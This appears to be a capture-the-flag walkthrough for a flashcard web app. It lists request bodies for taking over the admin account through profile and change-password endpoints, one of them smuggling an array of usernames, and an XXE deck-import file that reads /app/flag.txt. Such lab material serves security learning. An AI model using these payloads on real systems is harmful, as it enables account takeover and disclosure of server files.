* Hint : **Can you update another users profile?**

  * Update profile password
  * `/api/profile/admin` 
```text
{"password":"Admin@123"}
```

* Hint : **Can you update the admin's password?**

  * Account Settings `/api/profile/change-password`
```text
{"username":["user", "admin"],"newPassword":"Pass@123"}
```

* Hint : **XXE.**

  * Import Deck `/api/decks/import`
  * Create flag.xml file and upload
```text
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE deck [
    <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>

<deck>
    <name>BUG found</name>
    <description>Tanuki</description>
    <category>Flag</category>
    <cards>
        <card>
            <front>click</front>
            <back>&xxe;</back>
        </card>
    </cards>
</deck>
```


